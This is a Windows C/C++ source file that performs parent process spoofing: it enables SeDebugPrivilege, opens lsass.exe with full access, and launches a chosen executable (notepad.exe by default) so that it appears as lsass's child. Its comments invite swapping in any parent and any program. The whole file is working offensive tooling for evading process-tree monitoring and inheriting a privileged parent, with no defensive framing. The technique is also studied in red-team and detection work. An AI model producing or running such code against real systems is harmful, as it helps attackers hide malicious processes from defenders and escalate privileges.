//Spoofing a parent process, for choosing any parent process change - "lsass.exe" - to any desired processes.
//To choose the child process who is spoofing his parent, change - "C:\\Windows\\System32\\notepad.exe" - to any desired exe file.
//This program changes the AttributeList in the StartupInfo structure, and then the process created by CreatedProcess is created with new StartupInfo - Spoofing his parent process

#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>

#define MAX_LEN 1024


BOOL EnableDebug(void)
{
	LUID privilegeLuid;
	if (!LookupPrivilegeValue(NULL, _T("SeDebugPrivilege"), &privilegeLuid))
	{
		_tprintf(_T("Error - cant get privilege\n"));
		return FALSE;
	}

	TOKEN_PRIVILEGES privs;
	privs.PrivilegeCount = 1;
	privs.Privileges[0].Luid = privilegeLuid;
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	HANDLE currentProc = GetCurrentProcess();
	HANDLE token;

	if (!OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
	{
		_tprintf(_T("Error - cant get token from process\n"));
		return FALSE;
	}

	DWORD size = 0;
	GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
	PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)malloc(size);
	GetTokenInformation(token, TokenPrivileges, tokenPrivs, size, &size);

	PLUID_AND_ATTRIBUTES luid;
	for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
	{
		luid = &tokenPrivs->Privileges[i];
		if ((luid->Luid.LowPart == privilegeLuid.LowPart) & (luid->Luid.HighPart == privilegeLuid.HighPart))
		{
			if (AdjustTokenPrivileges(token, FALSE, &privs, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
			{
				_tprintf(_T("SeDebugPriv Enabled!"));
				return 0;
			}

		}
	}
	_tprintf(_T("Cant get SeDebugPriv Enabled!"));
	return 1;
}

DWORD GetPid(TCHAR* ProcName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);
	Process32First(snapshot, &process);

	while (Process32Next(snapshot, &process))
	{
		if (_tcscmp(process.szExeFile, ProcName) == 0)
		{
			break;
		}
	}
	CloseHandle(snapshot);
	return process.th32ProcessID;
}

int _tmain(int argc, TCHAR* argvp[])
{
	EnableDebug();
	TCHAR ProcName[MAX_LEN] = _T("lsass.exe");
	DWORD pid = GetPid(ProcName);

	HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	STARTUPINFOEX startInfo = { sizeof(startInfo) };
	PROCESS_INFORMATION processInfo;
	SIZE_T size = 0;
	PPROC_THREAD_ATTRIBUTE_LIST attributeList = NULL;
	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	startInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
	InitializeProcThreadAttributeList(startInfo.lpAttributeList, 1, 0, &size);
	UpdateProcThreadAttribute(startInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
	startInfo.StartupInfo.cb = (sizeof(STARTUPINFOEX));

	CreateProcess(_T("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFO>(&startInfo), &processInfo);
}
